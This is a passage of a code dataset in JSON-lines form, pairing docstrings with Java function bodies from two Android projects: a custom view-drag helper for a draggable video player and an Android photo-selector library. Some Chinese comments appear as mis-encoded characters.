break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                // If we're idle we can do anything! Treat it like a normal down event.\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                tryCaptureViewForDrag(toCapture, pointerId);\n\n                final int edgesTouched = mInitialEdgesTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (isCapturedViewUnder((int) x, (int) y)) {\n                // We're still tracking a captured view. If the same view is under this\n                // point, we'll swap to controlling it with this pointer instead.\n                // (This will still work if we're \"catching\" a settling view.)\n\n                tryCaptureViewForDrag(mCapturedView, pointerId);\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            if (mDragState == STATE_DRAGGING) {\n                final int index = MotionEventCompat.findPointerIndex(ev, mActivePointerId);\n                final float x = MotionEventCompat.getX(ev, index);\n                final float y = MotionEventCompat.getY(ev, index);\n                final int idx = (int) (x - mLastMotionX[mActivePointerId]);\n                final int idy = (int) (y - mLastMotionY[mActivePointerId]);\n\n                dragTo(mCapturedView.getLeft() + idx, mCapturedView.getTop() + idy, idx, idy);\n\n                saveLastMotion(ev);\n            } else {\n                // Check to see if any pointer is now over a draggable view.\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    final float dx = x - mInitialMotionX[pointerId];\n                    final float dy = y - mInitialMotionY[pointerId];\n\n                    reportNewEdgeDrags(dx, dy, pointerId);\n                    if (mDragState == STATE_DRAGGING) {\n                        // Callback might have started an edge drag.\n                        break;\n                    }\n\n                    final View toCapture = findTopChildUnder((int) x, (int) y);\n                    if (checkTouchSlop(toCapture, dx, dy) &&\n                            tryCaptureViewForDrag(toCapture, pointerId)) {\n                        break;\n                    }\n                }\n                saveLastMotion(ev);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            if (mDragState == STATE_DRAGGING && pointerId == mActivePointerId) {\n                // Try to find another pointer that's still holding on to the captured view.\n                int newActivePointer = INVALID_POINTER;\n                final int pointerCount = MotionEventCompat.getPointerCount(ev);\n                for (int i = 0; i < pointerCount; i++) {\n                    final int id = MotionEventCompat.getPointerId(ev, i);\n                    if (id == mActivePointerId) {\n                        // This one's going away, skip.\n                        continue;\n                    }\n\n                    final float x = MotionEventCompat.getX(ev, i);\n                    final float y = MotionEventCompat.getY(ev, i);\n                    if (findTopChildUnder((int) x, (int) y) == mCapturedView &&\n                            tryCaptureViewForDrag(mCapturedView, id)) {\n                        newActivePointer = mActivePointerId;\n                        break;\n                    }\n                }\n\n                if (newActivePointer == INVALID_POINTER) {\n                    // We didn't find another pointer still touching the view, release it.\n                    releaseViewForPointerUp();\n                }\n            }\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP: {\n            if (mDragState == STATE_DRAGGING) {\n                releaseViewForPointerUp();\n            }\n            cancel();\n            break;\n        }\n\n        case MotionEvent.ACTION_CANCEL: {\n            if (mDragState == STATE_DRAGGING) {\n                dispatchViewReleased(0, 0);\n            }\n            cancel();\n            break;\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Settle the captured view based on standard free-moving fling behavior.\n * The caller should invoke {@link #continueSettling(boolean)} on each subsequent frame\n * to continue the motion until it returns false.\n *\n * @param minLeft Minimum X position for the view's left edge\n * @param minTop Minimum Y position for the view's top edge\n * @param maxLeft Maximum X position for the view's left edge\n * @param maxTop Maximum Y position for the view's top edge\n */\n", "func_signal": "public void flingCapturedView(int minLeft, int minTop, int maxLeft, int maxTop)", "code": "{\n    if (!mReleaseInProgress) {\n        throw new IllegalStateException(\"Cannot flingCapturedView outside of a call to \" +\n                \"Callback#onViewReleased\");\n    }\n\n    mScroller.fling(mCapturedView.getLeft(), mCapturedView.getTop(),\n            (int) VelocityTrackerCompat.getXVelocity(mVelocityTracker, mActivePointerId),\n            (int) VelocityTrackerCompat.getYVelocity(mVelocityTracker, mActivePointerId),\n            minLeft, maxLeft, minTop, maxTop);\n\n    setDragState(STATE_SETTLING);\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Apps should use ViewDragHelper.create() to get a new instance.\n * This will allow VDH to use internal compatibility implementations for different\n * platform versions.\n *\n * @param context Context to initialize config-dependent params from\n * @param forParent Parent view to monitor\n */\n", "func_signal": "private CustomViewDragHelper(Context context, ViewGroup forParent, Callback cb)", "code": "{\n    if (forParent == null) {\n        throw new IllegalArgumentException(\"Parent view may not be null\");\n    }\n    if (cb == null) {\n        throw new IllegalArgumentException(\"Callback may not be null\");\n    }\n\n    mParentView = forParent;\n    mCallback = cb;\n\n    final ViewConfiguration vc = ViewConfiguration.get(context);\n    final float density = context.getResources().getDisplayMetrics().density;\n    mEdgeSize = (int) (EDGE_SIZE * density + 0.5f);\n\n    mTouchSlop = vc.getScaledTouchSlop();\n    mMaxVelocity = vc.getScaledMaximumFlingVelocity();\n    mMinVelocity = vc.getScaledMinimumFlingVelocity();\n    mScroller = ScrollerCompat.create(context, sInterpolator);\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax.\n * If the value is below the minimum, it will be clamped to zero.\n * If the value is above the maximum, it will be clamped to the maximum.\n *\n * @param value Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private int clampMag(int value, int absMin, int absMax)", "code": "{\n    final int absValue = Math.abs(value);\n    if (absValue < absMin) return 0;\n    if (absValue > absMax) return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Capture a specific child view for dragging within the parent. The callback will be notified\n * but {@link Callback#tryCaptureView(View, int)} will not be asked permission to\n * capture this view.\n *\n * @param childView Child view to capture\n * @param activePointerId ID of the pointer that is dragging the captured child view\n */\n", "func_signal": "public void captureChildView(View childView, int activePointerId)", "code": "{\n    if (childView.getParent() != mParentView) {\n        throw new IllegalArgumentException(\"captureChildView: parameter must be a descendant \" +\n                \"of the ViewDragHelper's tracked parent view (\" + mParentView + \")\");\n    }\n\n    mCapturedView = childView;\n    mActivePointerId = activePointerId;\n    mCallback.onViewCaptured(childView, activePointerId);\n    setDragState(STATE_DRAGGING);\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Check if the specified pointer tracked in the current gesture has crossed\n * the required slop threshold.\n *\n * <p>This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only rely on\n * the results of this method after all currently available touch data\n * has been provided to one of these two methods.</p>\n *\n * @param directions Combination of direction flags, see {@link #DIRECTION_HORIZONTAL},\n *                   {@link #DIRECTION_VERTICAL}, {@link #DIRECTION_ALL}\n * @param pointerId ID of the pointer to slop check as specified by MotionEvent\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions, int pointerId)", "code": "{\n    if (!isPointerDown(pointerId)) {\n        return false;\n    }\n\n    final boolean checkHorizontal = (directions & DIRECTION_HORIZONTAL) == DIRECTION_HORIZONTAL;\n    final boolean checkVertical = (directions & DIRECTION_VERTICAL) == DIRECTION_VERTICAL;\n\n    final float dx = mLastMotionX[pointerId] - mInitialMotionX[pointerId];\n    final float dy = mLastMotionY[pointerId] - mInitialMotionY[pointerId];\n\n    if (checkHorizontal && checkVertical) {\n        return dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n    } else if (checkHorizontal) {\n        return Math.abs(dx) > mTouchSlop;\n    } else if (checkVertical) {\n        return Math.abs(dy) > mTouchSlop;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Determine if the supplied view is under the given point in the\n * parent view's coordinate system.\n *\n * @param view Child view of the parent to hit test\n * @param x X position to test in the parent's coordinate system\n * @param y Y position to test in the parent's coordinate system\n * @return true if the supplied view is under the given point, false otherwise\n */\n", "func_signal": "public boolean isViewUnder(View view, int x, int y)", "code": "{\n    if (view == null) {\n        return false;\n    }\n    return x >= view.getLeft() &&\n            x < view.getRight() &&\n            y >= view.getTop() &&\n            y < view.getBottom();\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Find the topmost child under the given point within the parent view's coordinate system.\n * The child order is determined using {@link Callback#getOrderedChildIndex(int)}.\n *\n * @param x X position to test in the parent's coordinate system\n * @param y Y position to test in the parent's coordinate system\n * @return The topmost child view under (x, y) or null if none found.\n */\n", "func_signal": "public View findTopChildUnder(int x, int y)", "code": "{\n    final int childCount = mParentView.getChildCount();\n    for (int i = childCount - 1; i >= 0; i--) {\n        final View child = mParentView.getChildAt(mCallback.getOrderedChildIndex(i));\n        if (x >= child.getLeft() && x < child.getRight() &&\n                y >= child.getTop() && y < child.getBottom()) {\n            return child;\n        }\n    }\n    return null;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Factory method to create a new ViewDragHelper.\n *\n * @param forParent Parent view to monitor\n * @param sensitivity Multiplier for how sensitive the helper should be about detecting\n *                    the start of a drag. Larger values are more sensitive. 1.0f is normal.\n * @param cb Callback to provide information and receive events\n * @return a new ViewDragHelper instance\n */\n", "func_signal": "public static CustomViewDragHelper create(ViewGroup forParent, float sensitivity, Callback cb)", "code": "{\n    final CustomViewDragHelper helper = create(forParent, cb);\n    helper.mTouchSlop = (int) (helper.mTouchSlop * (1 / sensitivity));\n    return helper;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Check if this event as provided to the parent view's onInterceptTouchEvent should\n * cause the parent to intercept the touch event stream.\n *\n * @param ev MotionEvent provided to onInterceptTouchEvent\n * @return true if the parent view should return true from onInterceptTouchEvent\n */\n", "func_signal": "public boolean shouldInterceptTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            saveInitialMotion(x, y, pointerId);\n\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            // Catch a settling view if possible.\n            if (toCapture == mCapturedView && mDragState == STATE_SETTLING) {\n                tryCaptureViewForDrag(toCapture, pointerId);\n            }\n\n            final int edgesTouched = mInitialEdgesTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_DOWN: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            final float x = MotionEventCompat.getX(ev, actionIndex);\n            final float y = MotionEventCompat.getY(ev, actionIndex);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // A ViewDragHelper can only manipulate one view at a time.\n            if (mDragState == STATE_IDLE) {\n                final int edgesTouched = mInitialEdgesTouched[pointerId];\n                if ((edgesTouched & mTrackingEdges) != 0) {\n                    mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n                }\n            } else if (mDragState == STATE_SETTLING) {\n                // Catch a settling view if possible.\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                if (toCapture == mCapturedView) {\n                    tryCaptureViewForDrag(toCapture, pointerId);\n                }\n            }\n            break;\n        }\n\n        case MotionEvent.ACTION_MOVE: {\n            if (mInitialMotionX == null || mInitialMotionY == null) break;\n\n            // First to cross a touch slop over a draggable view wins. Also report edge drags.\n            final int pointerCount = MotionEventCompat.getPointerCount(ev);\n            for (int i = 0; i < pointerCount; i++) {\n                final int pointerId = MotionEventCompat.getPointerId(ev, i);\n                final float x = MotionEventCompat.getX(ev, i);\n                final float y = MotionEventCompat.getY(ev, i);\n                final float dx = x - mInitialMotionX[pointerId];\n                final float dy = y - mInitialMotionY[pointerId];\n\n                final View toCapture = findTopChildUnder((int) x, (int) y);\n                final boolean pastSlop = toCapture != null && checkTouchSlop(toCapture, dx, dy);\n                if (pastSlop) {\n                    // check the callback's\n                    // getView[Horizontal|Vertical]DragRange methods to know\n                    // if you can move at all along an axis, then see if it\n                    // would clamp to the same value. If you can't move at\n                    // all in every dimension with a nonzero range, bail.\n                    final int oldLeft = toCapture.getLeft();\n                    final int targetLeft = oldLeft + (int) dx;\n                    final int newLeft = mCallback.clampViewPositionHorizontal(toCapture,\n                            targetLeft, (int) dx);\n                    final int oldTop = toCapture.getTop();\n                    final int targetTop = oldTop + (int) dy;\n                    final int newTop = mCallback.clampViewPositionVertical(toCapture, targetTop,\n                            (int) dy);\n                    final int horizontalDragRange = mCallback.getViewHorizontalDragRange(\n                            toCapture);\n                    final int verticalDragRange = mCallback.getViewVerticalDragRange(toCapture);\n                    if ((horizontalDragRange == 0 || horizontalDragRange > 0\n                            && newLeft == oldLeft) && (verticalDragRange == 0\n                            || verticalDragRange > 0 && newTop == oldTop)) {\n                        break;\n                    }\n                }\n                reportNewEdgeDrags(dx, dy, pointerId);\n                if (mDragState == STATE_DRAGGING) {\n                    // Callback might have started an edge drag\n                    break;\n                }\n\n                if (pastSlop && tryCaptureViewForDrag(toCapture, pointerId)) {\n                    break;\n                }\n            }\n            saveLastMotion(ev);\n            break;\n        }\n\n        case MotionEventCompat.ACTION_POINTER_UP: {\n            final int pointerId = MotionEventCompat.getPointerId(ev, actionIndex);\n            clearMotionHistory(pointerId);\n            break;\n        }\n\n        case MotionEvent.ACTION_UP:\n        case MotionEvent.ACTION_CANCEL: {\n            cancel();\n            break;\n        }\n    }\n\n    return mDragState == STATE_DRAGGING;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Settle the captured view at the given (left, top) position.\n *\n * @param finalLeft Target left position for the captured view\n * @param finalTop Target top position for the captured view\n * @param xvel Horizontal velocity\n * @param yvel Vertical velocity\n * @return true if animation should continue through {@link #continueSettling(boolean)} calls\n */\n", "func_signal": "private boolean forceSettleCapturedViewAt(int finalLeft, int finalTop, int xvel, int yvel)", "code": "{\n    final int startLeft = mCapturedView.getLeft();\n    final int startTop = mCapturedView.getTop();\n    final int dx = finalLeft - startLeft;\n    final int dy = finalTop - startTop;\n\n    if (dx == 0 && dy == 0) {\n        // Nothing to do. Send callbacks, be done.\n        mScroller.abortAnimation();\n        setDragState(STATE_IDLE);\n        return false;\n    }\n\n    final int duration = computeSettleDuration(mCapturedView, dx, dy, xvel, yvel);\n    mScroller.startScroll(startLeft, startTop, dx, dy, duration);\n\n    setDragState(STATE_SETTLING);\n    return true;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Like all callback events this must happen on the UI thread, but release\n * involves some extra semantics. During a release (mReleaseInProgress)\n * is the only time it is valid to call {@link #settleCapturedViewAt(int, int)}\n * or {@link #flingCapturedView(int, int, int, int)}.\n */\n", "func_signal": "private void dispatchViewReleased(float xvel, float yvel)", "code": "{\n    mReleaseInProgress = true;\n    mCallback.onViewReleased(mCapturedView, xvel, yvel);\n    mReleaseInProgress = false;\n\n    if (mDragState == STATE_DRAGGING) {\n        // onViewReleased didn't call a method that would have changed this. Go idle.\n        setDragState(STATE_IDLE);\n    }\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Check if any of the edges specified were initially touched in the currently active gesture.\n * If there is no currently active gesture this method will return false.\n *\n * @param edges Edges to check for an initial edge touch. See {@link #EDGE_LEFT},\n *              {@link #EDGE_TOP}, {@link #EDGE_RIGHT}, {@link #EDGE_BOTTOM} and\n *              {@link #EDGE_ALL}\n * @return true if any of the edges specified were initially touched in the current gesture\n */\n", "func_signal": "public boolean isEdgeTouched(int edges)", "code": "{\n    final int count = mInitialEdgesTouched.length;\n    for (int i = 0; i < count; i++) {\n        if (isEdgeTouched(edges, i)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Check if any pointer tracked in the current gesture has crossed\n * the required slop threshold.\n *\n * <p>This depends on internal state populated by\n * {@link #shouldInterceptTouchEvent(MotionEvent)} or\n * {@link #processTouchEvent(MotionEvent)}. You should only rely on\n * the results of this method after all currently available touch data\n * has been provided to one of these two methods.</p>\n *\n * @param directions Combination of direction flags, see {@link #DIRECTION_HORIZONTAL},\n *                   {@link #DIRECTION_VERTICAL}, {@link #DIRECTION_ALL}\n * @return true if the slop threshold has been crossed, false otherwise\n */\n", "func_signal": "public boolean checkTouchSlop(int directions)", "code": "{\n    final int count = mInitialMotionX.length;\n    for (int i = 0; i < count; i++) {\n        if (checkTouchSlop(directions, i)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#equals(java.lang.Object)\n */\n", "func_signal": "@Override\npublic boolean equals(Object obj)", "code": "{\n\tif (this == obj) {\n\t\treturn true;\n\t}\n\tif (obj == null) {\n\t\treturn false;\n\t}\n\tif (!(obj instanceof PhotoModel)) {\n\t\treturn false;\n\t}\n\tPhotoModel other = (PhotoModel) obj;\n\tif (originalPath == null) {\n\t\tif (other.originalPath != null) {\n\t\t\treturn false;\n\t\t}\n\t} else if (!originalPath.equals(other.originalPath)) {\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "src\\com\\photoselector\\model\\PhotoModel.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u04bb\u05a1 */\n", "func_signal": "public static void startAnimation(int resId, View view)", "code": "{\n\tview.setBackgroundResource(resId);\n\t((AnimationDrawable) view.getBackground()).start();\n}", "path": "src\\com\\photoselector\\util\\AnimationUtil.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u00b3\u00f5\u00ca\u00bc\u00bb\u00af */\n", "func_signal": "public void update(AlbumModel album)", "code": "{\n\tsetAlbumImage(album.getRecent());\n\tsetName(album.getName());\n\tsetCount(album.getCount());\n\tisCheck(album.isCheck());\n}", "path": "src\\com\\photoselector\\ui\\AlbumItem.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u9884\u89c8\u7167\u7247 */\n", "func_signal": "private void priview()", "code": "{\n\tBundle bundle = new Bundle();\n\tbundle.putSerializable(\"photos\", selected);\n\tCommonUtils.launchActivity(this, PhotoPreviewActivity.class, bundle);\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/* (non-Javadoc)\n * @see com.polites.android.Transformer#update(com.polites.android.GestureImageView, long)\n */\n", "func_signal": "@Override\npublic boolean update(GestureImageView view, long time)", "code": "{\n\tfloat seconds = (float) time / 1000.0f;\n\t\n\tfloat dx = velocityX * seconds;\n\tfloat dy = velocityY * seconds;\n\t\n\tvelocityX *= factor;\n\tvelocityY *= factor;\n\t\n\tboolean active = (Math.abs(velocityX) > threshold && Math.abs(velocityY) > threshold);\n\t\n\tif(listener != null) {\n\t\tlistener.onMove(dx, dy);\n\t\t\n\t\tif(!active) {\n\t\t\tlistener.onComplete();\n\t\t}\n\t}\n\t\n\treturn active;\n}", "path": "src\\com\\polites\\FlingAnimation.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u5f39\u51fa\u76f8\u518c\u5217\u8868 */\n", "func_signal": "private void popAlbum()", "code": "{\n\tlayoutAlbum.setVisibility(View.VISIBLE);\n\tnew AnimationUtil(getApplicationContext(), R.anim.translate_up_current)\n\t\t\t.setLinearInterpolator().startAnimation(layoutAlbum);\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u9690\u85cf\u76f8\u518c\u5217\u8868 */\n", "func_signal": "private void hideAlbum()", "code": "{\n\tnew AnimationUtil(getApplicationContext(), R.anim.translate_down)\n\t\t\t.setLinearInterpolator().startAnimation(layoutAlbum);\n\tlayoutAlbum.setVisibility(View.GONE);\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u5b8c\u6210 */\n", "func_signal": "private void ok()", "code": "{\n\tif (selected.isEmpty()) {\n\t\tsetResult(RESULT_CANCELED);\n\t} else {\n\t\tIntent data = new Intent();\n\t\tBundle bundle = new Bundle();\n\t\tbundle.putSerializable(\"photos\", selected);\n\t\tdata.putExtras(bundle);\n\t\tsetResult(RESULT_OK, data);\n\t}\n\tfinish();\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u0536\u04bbTranslate\u0375Animation */\n", "func_signal": "public AnimationUtil(float fromXDelta, float toXDelta, float fromYDelta,\n\t\tfloat toYDelta)", "code": "{\n\tanimation = new TranslateAnimation(fromXDelta, toXDelta, fromYDelta,\n\t\t\ttoYDelta);\n}", "path": "src\\com\\photoselector\\util\\AnimationUtil.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u04bb\u0132 */\n", "func_signal": "public AnimationUtil setInterpolator(Interpolator i)", "code": "{\n\tanimation.setInterpolator(i);\n\treturn this;\n}", "path": "src\\com\\photoselector\\util\\AnimationUtil.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "// \u0638\u02b1\u013c\n", "func_signal": "public AnimationUtil(Context context, int resId)", "code": "{\n\t\tthis.animation = AnimationUtils.loadAnimation(context, resId);\n\t\tthis.animation.setAnimationListener(this);\n\t}", "path": "src\\com\\photoselector\\util\\AnimationUtil.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u6e05\u7a7a\u9009\u4e2d\u7684\u56fe\u7247 */\n", "func_signal": "private void reset()", "code": "{\n\tselected.clear();\n\ttvNumber.setText(\"(0)\");\n\ttvPreview.setEnabled(false);\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u7167\u7247\u9009\u4e2d\u72b6\u6001\u6539\u53d8\u4e4b\u540e */\n", "func_signal": "public void onCheckedChanged(PhotoModel photoModel,\n\t\tCompoundButton buttonView, boolean isChecked)", "code": "{\n\tif (isChecked) {\n\t\tif (!selected.contains(photoModel))\n\t\t\tselected.add(photoModel);\n\t\ttvPreview.setEnabled(true);\n\t} else {\n\t\tselected.remove(photoModel);\n\t}\n\ttvNumber.setText(\"(\" + selected.size() + \")\");\n\n\tif (selected.isEmpty()) {\n\t\ttvPreview.setEnabled(false);\n\t\ttvPreview.setText(getString(R.string.preview));\n\t}\n}", "path": "src\\com\\photoselector\\ui\\PhotoSelectorActivity.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "//\t@Override\n//\tpublic boolean equals(Object o) {\n//\t\tif (o.getClass() == getClass()) {\n//\t\t\tPhotoModel model = (PhotoModel) o;\n//\t\t\tif (this.getOriginalPath().equals(model.getOriginalPath())) {\n//\t\t\t\treturn true;\n//\t\t\t}\n//\t\t}\n//\t\treturn false;\n//\t}\n", "func_signal": "public void setChecked(boolean isChecked)", "code": "{\n\t\tSystem.out.println(\"checked \" + isChecked + \" for \" + originalPath);\n\t\tthis.isChecked = isChecked;\n\t}", "path": "src\\com\\photoselector\\model\\PhotoModel.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/* (non-Javadoc)\n * @see java.lang.Object#hashCode()\n */\n", "func_signal": "@Override\npublic int hashCode()", "code": "{\n\tfinal int prime = 31;\n\tint result = 1;\n\tresult = prime * result + ((originalPath == null) ? 0 : originalPath.hashCode());\n\treturn result;\n}", "path": "src\\com\\photoselector\\model\\PhotoModel.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u05ae\u02b1 */\n", "func_signal": "public AnimationUtil setStartOffSet(long startOffset)", "code": "{\n\tanimation.setStartOffset(startOffset);\n\treturn this;\n}", "path": "src\\com\\photoselector\\util\\AnimationUtil.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
{"docstring": "/** \u0221\u00b5\u01ac\u03e2 */\n", "func_signal": "public void getAlbum(final String name, final OnLocalReccentListener listener)", "code": "{\n\tfinal Handler handler = new Handler() {\n\t\t@SuppressWarnings(\"unchecked\")\n\t\t@Override\n\t\tpublic void handleMessage(Message msg) {\n\t\t\tlistener.onPhotoLoaded((List<PhotoModel>) msg.obj);\n\t\t}\n\t};\n\tnew Thread(new Runnable() {\n\t\t@Override\n\t\tpublic void run() {\n\t\t\tList<PhotoModel> photos = albumController.getAlbum(name);\n\t\t\tMessage msg = new Message();\n\t\t\tmsg.obj = photos;\n\t\t\thandler.sendMessage(msg);\n\t\t}\n\t}).start();\n}", "path": "src\\com\\photoselector\\domain\\PhotoSelectorDomain.java", "repo_name": "AizazZaidee/Android-Ultra-Photo-Selector", "stars": 688, "license": "None", "language": "java", "size": 10066}
